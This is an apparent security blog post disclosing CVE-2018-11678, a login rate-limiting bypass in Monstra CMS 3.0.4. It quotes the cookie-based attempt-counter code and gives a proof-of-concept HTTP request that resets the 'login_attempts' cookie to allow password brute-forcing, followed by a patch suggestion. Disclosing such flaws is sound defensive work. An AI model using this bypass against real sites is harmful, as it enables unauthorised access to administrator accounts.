---
private: 'false'
layout: post
featured: false
published: true
comments: true
modified: 2018-04-01
date: 2018-04-01
title: "Monstra CMS - 3.0.4 Login Rate Limiting Bypass"
tags: [exploit]
mathjax: false
imagefeature: 
description: "Monstra CMS - 3.0.4 Login Rate Limiting Bypass"
chart: null
---


CVE-2018-11678
---

- **Exploit Title:** Monstra CMS <= 3.0.4 Login Rate Limiting Bypass
- **CVE:**  CVE-2018-11678
- **Vendor Homepage:** http://monstra.org/
- **Software Link:** https://bitbucket.org/Awilum/monstra/downloads/monstra-3.0.4.zip
- **Discovered by:** Abdillah Muhamad
- **Contact:** abdilah.pb@gmail.com
- **Website:** https://abdilahrf.github.io
- **Category:** webapps
- **Platform:** PHP
 
 
MonstraCMS 3.0.4 Implementing bruteforce protection in login form but we manage to bypass because we can control the cookie value.
 
**Vulnerable Code:** https://github.com/monstra-cms/monstra/blob/dev/plugins/box/users/users.plugin.php

line 396-400:

```php
        if (Cookie::get('login_attempts') && Cookie::get('login_attempts') >= 5) {
            
            Notification::setNow('error', __('You are banned for 10 minutes. Try again later', 'users'));
        } 
```
line 422-427:

```php
        if (Cookie::get('login_attempts') < 5) {
            $attempts = Cookie::get('login_attempts') + 1;
            Cookie::set('login_attempts', $attempts , 600);
        } else {
            Notification::setNow('error', __('You are banned for 10 minutes. Try again later', 'users'));
        }
```
line 437-442:

```php
        if (Cookie::get('login_attempts') < 5) {
            $attempts = Cookie::get('login_attempts') + 1;
            Cookie::set('login_attempts', $attempts , 600);
        } else {
            Notification::setNow('error', __('You are banned for 10 minutes. Try again later', 'users'));
        }
 ```
 
#### Proof of Concept

Steps to Reproduce:
- Always set login_attempts cookie to 0 before send the POST request or if you using burp the cookie will not incrementing.

```
POST /monstra-3.0.4/admin/index.php?id=pages HTTP/1.1
Host: 127.0.0.1
Content-Length: 42
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36
Cookie: PHPSESSID=lsmo61pd53fe8gnmv77uck0c07; _ga=GA1.1.876410326.1527893558; _gid=GA1.1.716559964.1527893558; login_attempts=i%3A0%3B
Connection: close

login=admin&password=[PASSWORD_HERE]&login_submit=Log+In
```
 
#### Recommended Patch
Don't use cookie since we can easily control the value using Session much better

